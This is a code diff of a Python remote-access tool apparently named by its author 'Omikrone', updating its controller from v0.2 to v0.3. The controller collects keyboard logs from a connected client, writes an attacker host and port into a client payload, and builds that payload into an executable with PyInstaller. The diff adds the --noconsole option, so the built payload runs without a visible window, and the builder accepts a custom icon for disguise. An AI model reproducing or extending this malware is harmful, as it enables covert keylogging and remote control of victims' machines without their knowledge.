@@ -8,7 +8,7 @@ import os
 
 ##############################################
 #                                            #
-#                   v0.2                     #
+#                   v0.3                     #
 #           Coded by Omikrone                #
 #   GitHub: https://github.com/Omikrone/     #
 #                                            #
@@ -18,6 +18,7 @@ import os
 class Server:  # class Server: define the server properties
     def __init__(self, sock, client=None):
         self.client = client
+        self.sock = sock
 
     def send(self, data):  # custom send function
         pkt = struct.pack('>I', len(data)) + data
@@ -124,10 +125,12 @@ class Control(Server):
                 file.write(keylogs)
             print("Keylogger is finished. All the keyboard logs are in the file 'keylogs.txt'.")
         elif option == 'start':
+            open("keylogs.txt", "w").close()
             print("Keylogger is starting...")
 
     def background(self):
         self.send("background".encode())
+        self.sock.close()
         main_menu()
 
 
@@ -149,35 +152,43 @@ def main_menu():  # define the main menu
 
 
 def create():  # configure the client with ip and port
-    os.system(clear)
-    host = input("Enter the host/ip of the client: ")
-    port = input("Enter the port of the client: ")
-    exe = input("Do you want to create an executable (y/n): ")
-    with open('data/client.py', 'r', encoding='utf8') as file:
-        content = file.readlines()
-    content[content.index("HOST = '127.0.0.1'\n")] = f"HOST = '{host}'\n"
-    content[content.index("PORT = 51025\n")] = f"PORT = {port}\n"
-    with open('data/client.py', 'w', encoding='utf8') as file:
-        file.write(''.join(content))
 
-    if exe == 'y':
+    os.system(clear)
+    host = input("Enter the host/ip of the client (press ENTER for localhost): ")
+    port = input("Enter the port of the client (press ENTER for default port): ")
+    exe = input("Do you want to create an executable (y/n): ")
+
+    if host != '' and port != '':
+        with open('data/client.py', 'r', encoding='utf8') as file:
+            content = file.readlines()
+        content[content.index("HOST = \n")] = f"HOST = '{host}'\n"
+        content[content.index("PORT = \n")] = f"PORT = {port}\n"
+        with open('data/client.py', 'w', encoding='utf8') as file:
+            file.write(''.join(content))
+
+    if exe == 'y':  # creation of an executable file with PyInstaller
         icon = input("Enter the path of the icon (leave blank for default icon): ")
-        if icon == ' ':
-            command = "pyinstaller -F data/client.py -c --distpath exe"
+        if icon == '':
+            command = "pyinstaller -F data/client.py -c --noconsole --distpath exe"
         else:
-            command = f"pyinstaller -F data/client.py -c --distpath exe --icon={icon}"
+            command = f"pyinstaller -F data/client.py -c --noconsole --distpath exe --icon={icon}"
         os.system(clear)
         print('Creating the executable... This may take a while.')
         os.system(command)
         print("Executable file successfully created in folder 'exe'!\n")
     else:
         print("Python file successfully created!\n")
-    os.system('pause')
+    input("Press ENTER to continue...")
 
 
 def listener():  # define the socket and listen for connections
-    host = input("Enter your host/ip: ")
-    port = int(input("Enter your port: "))
+    host = input("Enter your host/ip (press ENTER for localhost): ")
+    port = input("Enter your port (press ENTER for default port): ")
+
+    if host == '': host = '127.0.0.1'
+    if port == '': port = 51025
+    else: port = int(port)
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.bind((host, port))
